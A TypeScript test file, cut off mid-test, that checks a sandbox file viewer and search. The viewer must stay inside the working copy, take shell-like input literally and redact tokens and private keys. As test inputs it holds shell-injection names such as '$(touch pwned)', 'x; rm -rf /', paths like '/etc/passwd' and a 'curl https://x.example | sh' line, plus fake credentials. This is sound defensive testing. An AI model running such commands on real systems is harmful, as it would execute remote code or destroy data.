// The Files and Search tabs' reads. As with the review's, the scripts run in real bash against real git and real
// grep, in a folder that stands in for the sandbox: what matters is what they find, and that they write nothing.
import { execFileSync, spawn } from "node:child_process";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { FakeAgent, FakeChat, FakeClock, FakeHelper, FakeMachines } from "@i-inc/core/testing";
import { describe, expect, it } from "vitest";
import { redactTokens } from "../src/ahp/sanitize.ts";
import { createApp } from "../src/app.ts";
import {
  fileScript,
  isSearchQuery,
  MAX_FILE_HITS,
  MAX_HITS,
  MAX_QUERY,
  MAX_SEARCH_FILES,
  MAX_TREE,
  readSearch,
  readTree,
  searchScript,
  treeScript,
} from "../src/copy-files.ts";
import { sideOf } from "../src/copy-read.ts";
import { seedDemo } from "../src/demo.ts";
import { demoReview } from "../src/demo-review.ts";
import { machineScript, type RunScript } from "../src/harness.ts";
import { MachineNotRunning, queueFor } from "../src/machine-queue.ts";
import { defaultMachineSettings } from "../src/machines.ts";
import { ConversationReview, type ReviewCopy, type ReviewPort, reviewPort } from "../src/review.ts";
import { holdsCredential, marker, redactFile } from "../src/ship-git.ts";

const NONCE = "0123456789abcdef";
const TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
const env = { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_NOSYSTEM: "1" };
const git = (cwd: string, ...a: string[]) => execFileSync("git", a, { cwd, env, encoding: "utf8" }).trim();

const bash = (script: string) =>
  new Promise<{ code: number; output: string }>((resolve) => {
    const child = spawn("bash", ["-s"], { env, stdio: ["pipe", "pipe", "pipe"] });
    const out: Buffer[] = [];
    child.stdout.on("data", (c) => out.push(c));
    child.stderr.on("data", (c) => out.push(c));
    child.on("close", (code) => resolve({ code: code ?? 1, output: Buffer.concat(out).toString("utf8") }));
    child.stdin.end(script);
  });

/** A working copy with one commit on main, or (`project` false) a plain folder. */
function rig(project: boolean | "no-commit" = true) {
  const root = mkdtempSync(join(tmpdir(), "inc-files-"));
  const work = join(root, "work");
  const cwd = join(work, "conv-ab12cd34");
  mkdirSync(cwd, { recursive: true });
  const run: RunScript = async (_who, script) => bash(script.replaceAll("/home/employee/work", work));
  const copy: ReviewCopy = {
    employeeId: "ada",
    cwd: "/home/employee/work/conv-ab12cd34",
    base: project ? "main" : null,
  };
  const write = (p: string, t: string | Buffer) => {
    mkdirSync(join(cwd, p, ".."), { recursive: true });
    writeFileSync(join(cwd, p), t);
  };
  if (project === "no-commit") git(cwd, "init", "-q", "-b", "main");
  if (project === true) {
    git(cwd, "init", "-q", "-b", "main");
    write("keep.txt", "one\nThe Needle here\nthree\n");
    write("gone.txt", "needle in a file that goes\n");
    write(".gitignore", "ignored.txt\n");
    git(cwd, "add", "-A");
    git(cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "base");
    git(cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
  }
  return { root, cwd, copy, port: reviewPort(run), write };
}

/** Everything in the copy's .git, by name, size and time: if git wrote anything, this differs. */
function fingerprint(dir: string): string {
  const out: string[] = [];
  const walk = (d: string) => {
    for (const name of readdirSync(d).sort()) {
      const p = join(d, name);
      const s = statSync(p);
      if (s.isDirectory()) walk(p);
      else out.push(`${p} ${s.size} ${s.mtimeMs}`);
    }
  };
  walk(dir);
  return out.join("\n");
}

describe("the file list", () => {
  it("still lists a tracked change beside a folder that became a link", async () => {
    const w = rig();
    w.write("d/a.txt", "one\n");
    w.write("auth.ts", "old\n");
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
    w.write("auth.ts", "new\n");
    w.write("other/b.txt", "two\n");
    execFileSync("rm", ["-rf", join(w.cwd, "d")]);
    symlinkSync("other", join(w.cwd, "d"));
    const list = await w.port.list(w.copy);
    expect(list.files.map((f) => f.path)).toContain("auth.ts");
    expect(list.files.map((f) => f.path)).toContain("d/a.txt");
  });

  it("doesn't call a tracked link deleted because .gitignore covers it", async () => {
    const w = rig();
    symlinkSync("keep.txt", join(w.cwd, "tracked-link"));
    w.write(".gitignore", "ignored.txt\ntracked-link\n");
    git(w.cwd, "add", "-A", "-f");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
    expect(git(w.cwd, "status", "--porcelain")).toBe("");
    expect((await w.port.list(w.copy)).files).toEqual([]);
  });

  it("still sees a tracked link change, go, or turn up where a file was", async () => {
    const w = rig();
    symlinkSync("keep.txt", join(w.cwd, "moved"));
    symlinkSync("keep.txt", join(w.cwd, "removed"));
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", "HEAD");
    execFileSync("rm", [join(w.cwd, "moved"), join(w.cwd, "removed"), join(w.cwd, "gone.txt")]);
    symlinkSync(".gitignore", join(w.cwd, "moved"));
    symlinkSync("keep.txt", join(w.cwd, "gone.txt"));
    symlinkSync("keep.txt", join(w.cwd, "fresh"));
    const list = await w.port.list(w.copy);
    expect(Object.fromEntries(list.files.map((f) => [f.path, f.status]))).toEqual({
      fresh: "added",
      "gone.txt": "type-changed",
      moved: "modified",
      removed: "deleted",
    });
    expect(list.partial).toBe(false);
  });

  it.skipIf(process.getuid?.() === 0)("says when a folder it can't enter may hold files", async () => {
    const w = rig();
    w.write("d/tracked.txt", "one\n");
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "more");
    w.write("d/new.txt", "new\n");
    chmodSync(join(w.cwd, "d"), 0);
    const list = await w.port.tree(w.copy);
    chmodSync(join(w.cwd, "d"), 0o755);
    expect(list.partial).toBe(true);
    expect(list.paths).toContain("keep.txt");
  });

  it.skipIf(process.getuid?.() === 0)("doesn't mind a shut folder that .gitignore covers", async () => {
    const w = rig();
    w.write(".gitignore", "shut/\n");
    w.write("shut/x.txt", "x\n");
    chmodSync(join(w.cwd, "shut"), 0);
    const list = await w.port.tree(w.copy);
    chmodSync(join(w.cwd, "shut"), 0o755);
    expect(list.partial).toBe(false);
  });

  it("has what is tracked and what is new, and not what is ignored or has gone", async () => {
    const w = rig();
    w.write("src/new.ts", "x\n");
    w.write("ignored.txt", "x\n");
    w.write(".inc/image.png", "x\n");
    execFileSync("rm", [join(w.cwd, "gone.txt")]);
    expect(await w.port.tree(w.copy)).toEqual({
      present: true,
      paths: [".gitignore", "keep.txt", "src/new.ts"],
      skipped: 0,
      truncated: false,
      partial: false,
    });
  });

  it("isn't told what to hide by the copy's own index or excludes", async () => {
    const w = rig();
    w.write("hidden.txt", "x\n");
    writeFileSync(join(w.cwd, ".git/info/exclude"), "hidden.txt\n");
    git(w.cwd, "update-index", "--skip-worktree", "keep.txt");
    const { paths } = await w.port.tree(w.copy);
    expect(paths).toContain("hidden.txt");
    expect(paths).toContain("keep.txt");
  });

  it("walks a folder that is no repository, past .git and dependencies, and makes no repository", async () => {
    const w = rig(false);
    w.write("notes.md", "x\n");
    w.write("deep/er/a.txt", "x\n");
    w.write("node_modules/dep/index.js", "x\n");
    symlinkSync("notes.md", join(w.cwd, "link"));
    expect((await w.port.tree(w.copy)).paths).toEqual(["deep/er/a.txt", "link", "notes.md"]);
    expect(existsSync(join(w.cwd, ".git"))).toBe(false);
  });

  it("walks a repository with no commit the same way", async () => {
    const w = rig("no-commit");
    w.write("a.txt", "x\n");
    expect((await w.port.tree(w.copy)).paths).toEqual(["a.txt"]);
  });

  it("leaves out and counts a name that isn't safe, and takes a shell word as a name", async () => {
    const w = rig();
    w.write("new\nline.txt", "x\n");
    w.write(`-rf`, "x\n");
    w.write(`$(touch pwned).txt`, "x\n");
    w.write(`${TOKEN}.txt`, "x\n");
    w.write("_authToken=abcdefgh12345678.txt", "x\n");
    const t = await w.port.tree(w.copy);
    expect(t.skipped).toBe(4);
    expect(t.paths).toContain("$(touch pwned).txt");
    expect(existsSync(join(w.cwd, "pwned"))).toBe(false);
  });

  it("drops a nested repository's folder row without calling it unsafe", async () => {
    const w = rig();
    mkdirSync(join(w.cwd, "sub"));
    git(join(w.cwd, "sub"), "init", "-q");
    expect((await w.port.tree(w.copy)).skipped).toBe(0);
  });

  it("says when the list is cut", () => {
    const names = Array.from({ length: MAX_TREE + 1 }, (_, i) => `f${i}\0`).join("");
    const out = [
      marker(NONCE, "tracked-begin"),
      names,
      marker(NONCE, "tracked-end"),
      marker(NONCE, "gone-begin"),
      "",
      marker(NONCE, "gone-end"),
      marker(NONCE, "new-begin"),
      "",
      marker(NONCE, "new-end"),
      marker(NONCE, "done"),
    ].join("\n");
    const t = readTree(out, NONCE);
    expect(t.paths).toHaveLength(MAX_TREE);
    expect(t.truncated).toBe(true);
  });

  it("calls a dead script a failure, not an empty folder", () => {
    expect(() => readTree("@@fail the list could not be read\n", NONCE)).toThrow(/could not be read/);
  });

  it("says when the folder isn't there", async () => {
    const w = rig();
    execFileSync("rm", ["-rf", w.cwd]);
    expect((await w.port.tree(w.copy)).present).toBe(false);
  });

  it("refuses a nonce or a folder it can't trust", () => {
    const w = rig();
    expect(() => treeScript(w.copy, "x; rm -rf /")).toThrow(/nonce/);
    expect(() => treeScript({ ...w.copy, cwd: "/etc" }, NONCE)).toThrow(/safe folder/);
  });
});

describe("one file", () => {
  it("reads what is on disk, committed or not, with tokens redacted and lines kept", async () => {
    const w = rig();
    w.write("keep.txt", `a\n-----BEGIN PRIVATE KEY-----\nabc\ndef\n-----END PRIVATE KEY-----\n${TOKEN}\nb\n`);
    const side = await w.port.read(w.copy, "keep.txt");
    expect(side?.state).toBe("text");
    expect(side?.text).not.toContain(TOKEN);
    expect(side?.text).not.toContain("abc");
    expect(side?.text?.split("\n").indexOf("b")).toBe(6);
  });

  it("says what a file is when it can't be shown", async () => {
    const w = rig();
    w.write("bin", Buffer.from([1, 0, 2]));
    w.write("big", "x".repeat(1_000_001));
    mkdirSync(join(w.cwd, "dir"));
    execFileSync("mkfifo", [join(w.cwd, "pipe")]);
    expect((await w.port.read(w.copy, "bin"))?.state).toBe("binary");
    expect((await w.port.read(w.copy, "big"))?.state).toBe("too-big");
    expect((await w.port.read(w.copy, "dir"))?.state).toBe("other");
    expect((await w.port.read(w.copy, "pipe"))?.state).toBe("other");
    expect((await w.port.read(w.copy, "nothing"))?.state).toBe("none");
  });

  it("doesn't follow a link out of the copy, at the end of the path or on the way", async () => {
    const w = rig();
    const outside = join(w.root, "secret.txt");
    writeFileSync(outside, "outside\n");
    symlinkSync(outside, join(w.cwd, "out"));
    symlinkSync(w.root, join(w.cwd, "up"));
    expect(await w.port.read(w.copy, "out")).toEqual({ state: "outside" });
    expect(await w.port.read(w.copy, "up/secret.txt")).toEqual({ state: "outside" });
  });

  it("doesn't reach .git or .inc through a link to the folder", async () => {
    const w = rig();
    w.write(".inc/photo.txt", "private\n");
    symlinkSync(".git", join(w.cwd, "g"));
    symlinkSync(".inc", join(w.cwd, "i"));
    expect(await w.port.read(w.copy, "g/config")).toEqual({ state: "outside" });
    expect(await w.port.read(w.copy, "i/photo.txt")).toEqual({ state: "outside" });
  });

  it("doesn't reach a nested .git through a link either", async () => {
    const w = rig();
    w.write("sub/.git/config", "secret\n");
    symlinkSync("sub/.git", join(w.cwd, "d"));
    expect(await w.port.read(w.copy, "d/config")).toEqual({ state: "outside" });
  });

  it("shows a link that stays inside as its target", async () => {
    const w = rig();
    symlinkSync("keep.txt", join(w.cwd, "in"));
    expect(await w.port.read(w.copy, "in")).toEqual({ state: "link", text: "keep.txt" });
  });

  it("needs no repository", async () => {
    const w = rig(false);
    w.write("notes.md", "hello\n");
    expect(await w.port.read(w.copy, "notes.md")).toEqual({ state: "text", text: "hello\n" });
  });

  it("refuses a path that isn't a plain relative one", () => {
    const w = rig();
    for (const bad of ["/etc/passwd", "../x", "a/../b", "-x", ".git/config", ".inc/a.png", "a\0b"]) {
      expect(() => fileScript(w.copy, bad, NONCE)).toThrow(/not a path/);
    }
  });
});

describe("a search", () => {
  it("finds lines in tracked and new files, by path and line", async () => {
    const w = rig();
    w.write("src/new.ts", "first\nneedle\n");
    const r = await w.port.search(w.copy, "needle", false);
    expect(r.hits).toEqual([
      { path: "gone.txt", line: 1, text: "needle in a file that goes" },
      { path: "keep.txt", line: 2, text: "The Needle here" },
      { path: "src/new.ts", line: 2, text: "needle" },
    ]);
  });

  it("minds case when told to", async () => {
    const w = rig();
    expect((await w.port.search(w.copy, "Needle", true)).hits.map((h) => h.path)).toEqual(["keep.txt"]);
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("sees what the file says now, not what the commit says", async () => {
    const w = rig();
    w.write("keep.txt", "changed\n");
    execFileSync("rm", [join(w.cwd, "gone.txt")]);
    expect((await w.port.search(w.copy, "needle", false)).hits).toEqual([]);
  });

  it("leaves out ignored files, binary files, .inc and links", async () => {
    const w = rig();
    w.write("ignored.txt", "needle\n");
    w.write("bin", Buffer.concat([Buffer.from("needle"), Buffer.from([0, 1])]));
    w.write(".inc/a.txt", "needle\n");
    symlinkSync(join(w.cwd, "keep.txt"), join(w.cwd, "link"));
    const paths = (await w.port.search(w.copy, "needle", false)).hits.map((h) => h.path);
    expect(paths).toEqual(["gone.txt", "keep.txt"]);
  });

  it("takes the query as words: never a flag, a pattern or a shell", async () => {
    const w = rig();
    w.write("odd.txt", "a.c\nabc\n--help\n'; touch pwned; '\n$(touch pwned)\n");
    const texts = async (q: string) => (await w.port.search(w.copy, q, false)).hits.map((h) => h.text);
    expect(await texts("a.c")).toEqual(["a.c"]);
    expect(await texts("--help")).toEqual(["--help"]);
    expect(await texts("'; touch pwned; '")).toEqual(["'; touch pwned; '"]);
    expect(await texts("$(touch pwned)")).toEqual(["$(touch pwned)"]);
    expect(existsSync(join(w.cwd, "pwned"))).toBe(false);
  });

  it("searches a folder with no repository with plain grep, and walks past .git and dependencies", async () => {
    const w = rig(false);
    w.write("notes.md", "one\nNeedle\n");
    w.write("node_modules/dep/index.js", "needle\n");
    w.write("bin", Buffer.concat([Buffer.from("needle"), Buffer.from([0, 1])]));
    const r = await w.port.search(w.copy, "needle", false);
    expect(r.hits).toEqual([{ path: "notes.md", line: 2, text: "Needle" }]);
    expect((await w.port.search(w.copy, "needle", true)).hits).toEqual([]);
    expect(existsSync(join(w.cwd, ".git"))).toBe(false);
  });

  it("finds a query that starts with a dash in plain grep too", async () => {
    const w = rig(false);
    w.write("notes.md", "--help\n");
    expect((await w.port.search(w.copy, "--help", false)).hits).toHaveLength(1);
  });

  it("shows a line as the viewer shows it, and a match in what was taken out is no match", async () => {
    const w = rig();
    w.write("cfg.txt", `key needle ${TOKEN}\n`);
    const shown = await w.port.search(w.copy, "key needle", false);
    expect(shown.hits).toContainEqual({ path: "cfg.txt", line: 1, text: "key needle [redacted]" });
    expect((await w.port.search(w.copy, TOKEN.slice(0, 12), false)).hits).toEqual([]);
  });

  it("gives away nothing about a secret by whether a guess at it matched", async () => {
    const w = rig();
    w.write("cfg.txt", `value ${TOKEN}\n`);
    w.write(".env", "API_KEY=hunter2hunter2\n");
    w.write("key.txt", "-----BEGIN PRIVATE KEY-----\nMIIabcdef\n-----END PRIVATE KEY-----\n");
    w.write("notes\x01.txt", "swordfish\n");
    const guess = (q: string) => w.port.search(w.copy, q, true);
    expect(await guess(TOKEN.slice(0, 8))).toEqual(await guess("ghp_zzzz"));
    expect(await guess("API_KEY=h")).toEqual(await guess("API_KEY=x"));
    expect(await guess("MIIabc")).toEqual(await guess("MIIabd"));
    expect(await guess("swordfish")).toEqual(await guess("swordfisk"));
  });

  it("doesn't find the letters of what redaction put in a line's place", async () => {
    const w = rig();
    w.write("cfg.txt", `x ${TOKEN} y\n`);
    for (const q of ["redacted", "edac", "[red"]) {
      expect((await w.port.search(w.copy, q, false)).hits, q).toEqual([]);
    }
  });

  it("can't differ from the viewer, however far a value sits from its label", async () => {
    const key = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12";
    const shapes = [
      `aws_secret_access_key:\n  ${key}\n`,
      `aws_secret_access_key:\n\n\n\n${key}\n`,
      `Authorization: Bearer\n  ${key}\n`,
      `Authorization: Bearer\n${"\n".repeat(30)}${key}\n`,
      `Bearer\r\n\r\n\r\n${key}\r\n`,
      `_authToken =\n  ${key}\n`,
      `_authToken\n\n\n=\n\n\n${key}\n`,
      `machine h login joe password\n  ${key}\n`,
      `machine h login\nu\npassword\n${key}\n`,
      `${"x ".repeat(1500)}aws_secret_access_key:\n${key}\n`,
      `# -----BEGIN PRIVATE KEY-----\n# ${key}\n# -----END PRIVATE KEY-----\n`,
      `---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\n${key}\n---- END SSH2 ENCRYPTED PRIVATE KEY ----\n`,
      `-----BEGIN PRIVATE KEY-----\nabc.def ghi\n${key}\n-----END PRIVATE KEY-----\n`,
    ];
    for (const text of shapes) {
      for (const project of [true, false]) {
        const w = rig(project);
        w.write("deploy.yaml", text);
        const seen = await w.port.read(w.copy, "deploy.yaml");
        const r = await w.port.search(w.copy, key.slice(0, 5), true);
        const fromViewer = seen?.text?.split("\n") ?? [];
        for (const h of r.hits) expect(fromViewer).toContain(h.text);
        expect(seen?.text ?? "", text).toSatisfy((t: string) => !t.includes(key) || r.hits.length > 0);
      }
    }
  });

  it("shows no key body in the viewer, whatever the lines around it look like", async () => {
    const body = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC";
    const shapes = [
      `# -----BEGIN PRIVATE KEY-----\n# ${body}\n# -----END PRIVATE KEY-----\nafter\n`,
      `// -----BEGIN RSA PRIVATE KEY-----\n// ${body}\n// -----END RSA PRIVATE KEY-----\nafter\n`,
      `-----BEGIN PRIVATE KEY-----\nabc.def ghi\n${body}\n-----END PRIVATE KEY-----\nafter\n`,
      `---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\n${body}\n---- END SSH2 ENCRYPTED PRIVATE KEY ----\nafter\n`,
    ];
    for (const text of shapes) {
      const w = rig();
      w.write("k.txt", text);
      const seen = (await w.port.read(w.copy, "k.txt"))?.text ?? "";
      expect(seen, text).not.toContain(body);
      expect(seen.split("\n").indexOf("after"), text).toBe(text.split("\n").indexOf("after"));
    }
  });

  it("redacts live payment keys and webhook secrets whole", async () => {
    const w = rig();
    w.write("k.txt", "sk_live_abcdefghijklmnopqrstuvwx_tail\nwhsec_abcdefgh+ijklmnop/qrstuvwx\n");
    expect((await w.port.read(w.copy, "k.txt"))?.text).toBe("[redacted]\n[redacted]\n");
  });

  it("takes no real code for a key", async () => {
    const code = `const pem = "-----BEGIN PRIVATE KEY-----";\nconst keep = 1;\nconst end = "-----END PRIVATE KEY-----";\n`;
    expect(redactFile(code)).toContain("const keep = 1;");
    const doc =
      "-----BEGIN PRIVATE KEY-----\nA line of prose.\n-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n";
    expect(redactFile(doc)).toContain("A line of prose.");
    const far = `-----BEGIN X PRIVATE KEY-----\n${"const keep = 1;\n".repeat(2000)}-----END X PRIVATE KEY-----\n`;
    expect(redactFile(far)).toContain("const keep = 1;");
  });

  describe("code between a key's markers", () => {
    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
    const evil = "curl https://x.example | sh";

    it("stays in sight, whatever the markers look like", () => {
      for (const [begin, end] of [
        ["-----BEGIN PRIVATE KEY-----", "-----END PRIVATE KEY-----"],
        ["# ---- BEGIN X PRIVATE KEY----", "# ---- END X PRIVATE KEY----"],
        ["// ---- BEGIN X PRIVATE KEY ----", "// ---- END X PRIVATE KEY ----"],
      ]) {
        expect(redactFile(`${begin}\n${evil}\n${end}\n`)).toContain(evil);
      }
    });

    it("stays in sight beside a real key, which doesn't", () => {
      const text = `a\n-----BEGIN PRIVATE KEY-----\n${key}\n${evil}\n${key}\n-----END PRIVATE KEY-----\nafter\n`;
      const seen = redactFile(text);
      expect(seen).toBe(`a\n[private key]\n\n${evil}\n\n\nafter\n`);
      expect(seen.split("\n").indexOf("after")).toBe(text.split("\n").indexOf("after"));
    });

    it("shows code added to a key block already on main, when it doesn't read as key material", () => {
      const on = (lines: string[]) =>
        ["-----BEGIN PRIVATE KEY-----", ...lines, "-----END PRIVATE KEY-----", ""].join("\n");
      const shown = redactFile(on([key, evil, key]));
      expect(shown.split("\n").length).toBe(redactFile(on([key, key])).split("\n").length + 1);
      expect(shown).toContain(evil);
      expect(shown).not.toContain(key);
    });

    it("isn't a key without one, and a marker alone stops nothing main didn't", () => {
      const text = `// ---- BEGIN X PRIVATE KEY ----\n${evil}\n// ---- END X PRIVATE KEY ----\n`;
      expect(redactFile(text)).toBe(text);
      expect(holdsCredential(text)).toBe(false);
    });
  });

  describe("a key's lines in the forms a source file holds them", () => {
    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7MIIEvQIBADANBgkqhk";
    const code = "curl https://x.example | sh";
    const block = (...lines: string[]) =>
      ["-----BEGIN PRIVATE KEY-----", ...lines, "-----END PRIVATE KEY-----", "after", ""].join("\n");

    it.each([
      ["a trailing backslash", `${key}\\`, "abc=="],
      ["a written-out newline", `${key}\\n\\`, "abc=="],
      ["a short line and a backslash", `${key}\\`, "abc==\\"],
      ["quotes and a comma", `"${key}",`, '"abc==",'],
      ["single quotes", `'${key}'`, "'abc=='"],
      ["a backtick", `\`${key}`, "abc==`;"],
      ["a concatenated string", `"${key}\\n" +`, '"abc==\\n";'],
      ["a commented quoted line", `# "${key}",`, "# abc=="],
      ["a prefix on the string", `b"${key}"`, "abc=="],
      ["words after the key", `${key} and more`, "abc=="],
    ])("takes them all with %s", (_, line, last) => {
      const text = block(line, line, last);
      const seen = redactFile(text);
      expect(seen).toBe(`[private key]\n\n\n\n\nafter\n`);
      expect(holdsCredential(text)).toBe(true);
    });

    it("takes them around code it leaves in sight, in as many lines", () => {
      const text = block(`"${key}",`, code, '"abc==",');
      expect(redactFile(text)).toBe(`[private key]\n\n${code}\n\n\nafter\n`);
    });

    it("isn't slowed by a line built to backtrack", () => {
      const at = performance.now();
      for (let i = 0; i < 50; i++) redactFile(block(`${"+".repeat(16_000)}.`));
      expect(performance.now() - at).toBeLessThan(2000);
    });
  });

  describe("what redactTokens hides, whatever a block's lines look like", () => {
    const k64 = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7MIIEvQIBADANBgk";
    const begin = "-----BEGIN PRIVATE KEY-----";
    const end = "-----END PRIVATE KEY-----";
    const block = (...lines: string[]) => [begin, ...lines, end, "after", ""].join("\n");
    /** What a line shows, placeholders aside. */
    const words = (line: string) => line.replaceAll("[private key]", "").replaceAll("[redacted]", "");
    /** Is every character of `shown` in `over`, in order? */
    const within = (shown: string, over: string) => {
      let at = 0;
      for (const c of shown) {
        at = over.indexOf(c, at) + 1;
        if (at === 0) return false;
      }
      return true;
    };
    const hiddenStaysHidden = (text: string) => {
      const plain = redactTokens(text, { keepLines: true }).split("\n");
      const seen = redactFile(text).split("\n");
      expect(seen.length).toBe(plain.length);
      for (const [i, line] of seen.entries()) {
        expect(within(words(line), words(plain[i] ?? "")), JSON.stringify({ text, line })).toBe(true);
      }
    };

    it.each([
      ["a last line with code after it", [k64, "abcdEFGH0123456789==; # last line"], "abcdEFGH0123456789"],
      ["an armor header it doesn't know", [k64, "Foo: s3cr3tValue0123456789"], "s3cr3tValue"],
      ["an armor header first", ["Key-Info: RSA,I3rRIGXUabcdefgh", k64], "I3rRIGXU"],
    ])("keeps %s hidden", (_, lines, secret) => {
      const text = block(...lines);
      expect(redactTokens(text)).not.toContain(secret);
      expect(redactFile(text)).not.toContain(secret);
      expect(redactFile(text).split("\n").length).toBe(text.split("\n").length);
      hiddenStaysHidden(text);
    });

    it("keeps a line glued to an end marker hidden", () => {
      const text = `${begin}\nabcdEFGH0123456789==${end}\nx\n${end}\n`;
      expect(redactFile(text)).not.toContain("abcdEFGH");
      hiddenStaysHidden(text);
    });

    it("keeps what lies behind a webhook secret hidden", () => {
      const jwt = "eyJhbGciOiJ.eyJzdWIiOiIx.c2lnbmF0dXJl";
      const text = `whsec_abcdefgh/${jwt} https://joe:whsec_abcdefgh+x@example.com/\n`;
      expect(redactFile(text)).not.toMatch(/eyJ|joe|c2ln/);
      hiddenStaysHidden(text);
    });

    it("keeps a value hidden when a live key is glued to its label", () => {
      const text = "sk_live_abcdefghijklmnopqrstsecret_key=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12\n";
      expect(redactFile(text)).not.toContain("wJalrXUtn");
      hiddenStaysHidden(text);
      const glued = "whsec_abcdefgh_secret_key = wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12\n";
      expect(redactFile(glued)).not.toContain("wJalrXUtn");
      hiddenStaysHidden(glued);
    });

    it("takes a block's lines out of what redactTokens leaves, and no more than those", () => {
      const text = `# ${begin}\n# ${k64}\ncurl https://x.example | sh\n# ${k64}\n# ${end}\nafter\n`;
      expect(redactFile(text)).toBe("# [private key]\n\ncurl https://x.example | sh\n\n\nafter\n");
    });

    it("puts the mark in place of a marker it doesn't take itself", () => {
      const text = `const k = "---- BEGIN X PRIVATE KEY ----\\n" +\n  "${k64}\\n" +\n  "---- END X PRIVATE KEY ----";\n`;
      expect(redactTokens(text)).toBe(text);
      expect(redactFile(text)).toBe('const k = "[private key]\n\n";\n');
    });

    it("holds over a fuzz of blocks, tokens and code", () => {
      const pieces = [
        begin,
        end,
        `# ${begin}`,
        `# ${end}`,
        "---- BEGIN X PRIVATE KEY ----",
        "---- END X PRIVATE KEY ----",
        `"${begin}\\n" +`,
        `"${end}\\n"`,
        k64,
        `"${k64}\\n" +`,
        `# ${k64}`,
        "abc==",
        "abcdEFGH0123456789==; # last",
        "Foo: s3cr3tValue",
        "Comment: work",
        "curl https://x.example | sh",
        "const keep = 1;",
        `${k64}${end}`,
        "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
        "eyJhbGciOiJ.eyJzdWIiOiIx.c2lnbmF0dXJl",
        "whsec_abcdefgh/eyJhbGciOiJ",
        "whsec_abcdefghijkl+x==",
        "whsec_abcdefgh_secret_key = wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12",
        "sk_live_abcdefghijklmnopqrstsecret_key=wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY12",
        "sk_live_abcdefghijklmnop_tail",
        "https://joe:p4ssw0rd@example.com/",
        "x?token=abcdef",
        "Bearer",
        "",
      ];
      let x = 20_260_211;
      const pick = (n: number) => {
        x = (x * 1_103_515_245 + 12_345) & 0x7fffffff;
        return (x >>> 8) % n;
      };
      for (let i = 0; i < 20_000; i++) {
        const lines = Array.from({ length: 1 + pick(9) }, () => pieces[pick(pieces.length)]);
        const text = `${lines.join(pick(4) ? "\n" : "\r\n")}\n`;
        hiddenStaysHidden(text);
        if (redactTokens(text) !== text) expect(holdsCredential(text), text).toBe(true);
      }
    });
  });

  describe("a key in a string joined over several lines", () => {
    const key = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7MIIEvQIBADANBgk";
    const begin = "-----BEGIN PRIVATE KEY-----";
    const end = "-----END PRIVATE KEY-----";

    it.each([
      [
        "Go",
        `const key = "${begin}\\n" +\n\t"${key}\\n" +\n\t"${key}\\n" +\n\t"${end}\\n"\nconst keep = 1\n`,
      ],
      [
        "Python",
        `KEY = (\n    "${begin}\\n"\n    "${key}\\n"\n    "abc==\\n"\n    "${end}\\n"\n)\nkeep = 1\n`,
      ],
      [
        "a JS array",
        `const key = [\n  "${begin}",\n  "${key}",\n  "abc==",\n  "${end}",\n].join("\\n");\nconst keep = 1;\n`,
      ],
      ["a Go raw string", `const key = \`${begin}\n${key}\nabc==\n${end}\`\nconst keep = 1\n`],
      [
        "a commented string",
        `// k := "${begin}\\n" +\n//   "${key}\\n" +\n//   "${end}\\n"\nconst keep = 1\n`,
      ],
    ])("takes it all in %s, in as many lines, and leaves what follows", (_, text) => {
      const seen = redactFile(text);
      expect(seen).not.toContain("MIIE");
      expect(seen).not.toContain("abc==");
      expect(seen).not.toContain("BEGIN");
      expect(seen).not.toContain("END");
      expect(seen.split("\n").length).toBe(text.split("\n").length);
      expect(seen).toMatch(/keep = 1/);
      expect(holdsCredential(text)).toBe(true);
    });

    it("keeps the code on a marker's line, and what follows the end", () => {
      const text = `f(); const k = "${begin}\\n" +\n  "${key}\\n" +\n  "${end}"; g();\nh();\n`;
      const seen = redactFile(text).split("\n");
      expect(seen[0]).toContain('f(); const k = "[private key]');
      expect(seen[1]).toBe("");
      expect(seen[2]).toBe('"; g();');
      expect(seen[3]).toBe("h();");
    });

    it.each([
      ["a bytes literal", `b"${key}"`, 'b"abc=="'],
      ["a backslash", `"${key}" \\`, '"abc==" \\'],
      ["a shell or", `'${key}' ||`, "'abc==' ||"],
      ["a PHP or Perl join", `"${key}" .`, '"abc==" .'],
      ["a YAML list", `  - ${key}`, "  - abc=="],
    ])("takes a short last line behind %s", (_, line, last) => {
      const seen = redactFile([begin, line, last, end, ""].join("\n"));
      expect(seen).toBe("[private key]\n\n\n\n");
    });

    it("takes no markers named in source code for a key, with only code between", () => {
